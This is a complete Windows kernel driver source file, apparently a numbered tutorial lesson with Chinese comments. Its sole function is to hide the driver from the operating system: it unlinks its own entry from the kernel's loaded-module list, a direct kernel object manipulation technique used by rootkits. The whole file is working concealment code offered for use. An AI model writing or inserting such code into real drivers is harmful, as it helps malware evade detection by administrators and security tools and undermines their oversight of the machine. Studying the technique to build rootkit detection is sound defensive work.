#include <ntddk.h>

typedef unsigned long DWORD;

typedef struct _KLDR_DATA_TABLE_ENTRY {
	LIST_ENTRY InLoadOrderLinks;
	PVOID ExceptionTable;
	ULONG ExceptionTableSize;
	PVOID GpValue;
	DWORD UnKnow;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	ULONG Flags;
	USHORT LoadCount;
	USHORT __Unused5;
	PVOID SectionPointer;
	ULONG CheckSum;
	PVOID LoadedImports;
	PVOID PatchInformation;
} KLDR_DATA_TABLE_ENTRY, *PKLDR_DATA_TABLE_ENTRY;

PDRIVER_OBJECT pDriverObject = NULL;

VOID
HideDriver()
{
	PKLDR_DATA_TABLE_ENTRY entry = (PKLDR_DATA_TABLE_ENTRY)pDriverObject->DriverSection;
	PKLDR_DATA_TABLE_ENTRY firstentry;
	UNICODE_STRING uniDriverName;

	firstentry = entry;

	// 初始化要隐藏驱动的驱动名
	RtlInitUnicodeString(&uniDriverName, L"003隐藏驱动模块.sys");

	while ((PKLDR_DATA_TABLE_ENTRY)entry->InLoadOrderLinks.Flink != firstentry)
	{
		if (entry->FullDllName.Buffer != 0)
		{
			if (RtlCompareUnicodeString(&uniDriverName, &(entry->BaseDllName), FALSE) == 0)
			{
				KdPrint(("隐藏驱动 %ws 成功!\n", entry->BaseDllName.Buffer));
				// 修改 Flink 和 Blink 指针, 以跳过我们要隐藏的驱动
				*((DWORD*)entry->InLoadOrderLinks.Blink) = (DWORD)entry->InLoadOrderLinks.Flink;
				entry->InLoadOrderLinks.Flink->Blink = entry->InLoadOrderLinks.Blink;

				/*
				使被隐藏驱动LIST_ENTRY结构体的Flink, Blink域指向自己
				因为此节点本来在链表中, 那么它邻接的节点驱动被卸载时,
				系统会把此节点的Flink, Blink域指向它相邻节点的下一个节点.
				但是, 它此时已经脱离链表了, 如果现在它原本相邻的节点驱动被
				卸载了, 那么此节点的Flink, Blink域将有可能指向无用的地址, 而
				造成随机性的BSoD.
				*/
				entry->InLoadOrderLinks.Flink = (LIST_ENTRY*)&(entry->InLoadOrderLinks.Flink);
				entry->InLoadOrderLinks.Blink = (LIST_ENTRY*)&(entry->InLoadOrderLinks.Flink);

				break;
			}
		}
		// 链表往前走
		entry = (PKLDR_DATA_TABLE_ENTRY)entry->InLoadOrderLinks.Flink;
	}
}

NTSTATUS
UnloadDriver(
IN PDRIVER_OBJECT DriverObject
)
{
	DriverObject;
	return STATUS_SUCCESS;
}

NTSTATUS
DriverEntry(
IN PDRIVER_OBJECT DriverObject,
IN PUNICODE_STRING  RegistryPath
)
{
	RegistryPath;
	DriverObject->DriverUnload = UnloadDriver;
	pDriverObject = DriverObject;
	HideDriver();
	return STATUS_SUCCESS;
}
